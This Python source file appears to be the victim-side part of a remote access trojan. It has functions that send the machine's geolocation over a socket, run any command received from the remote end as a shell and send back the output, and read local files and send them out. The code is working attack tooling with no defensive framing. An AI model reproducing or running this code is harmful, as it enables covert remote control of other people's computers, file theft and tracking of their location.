import os
import subprocess
import socket

import requests


def get_geolocate(conn: socket.socket) -> None:
    try:
        result = requests.get("https://geolocation-db.com/json")
        conn.send(result.text.encode())
        result.close()
    except Exception as err:
        conn.send("An error has occurred ", err)


def shell(conn: socket.socket) -> None:
    while True:
        command = conn.recv(20480).decode()

        if command[:2] == 'cd':
            os.chdir(command[3:])
            current_dir = os.getcwd()
            conn.send(current_dir.encode())

        elif command == 'exit':
            break

        elif len(command) > 0:
            try:
                output = subprocess.getoutput(command)
                conn.send(output.encode())
            except Exception as err:
                conn.send(f'Error {err}'.encode())


def download(filename: str, conn: socket.socket) -> None:
    try:
        with open(filename, 'r') as file:
            data = file.read()
            conn.send(data.encode())
    except Exception as err:
        conn.send(f"An error has occurred {err}")
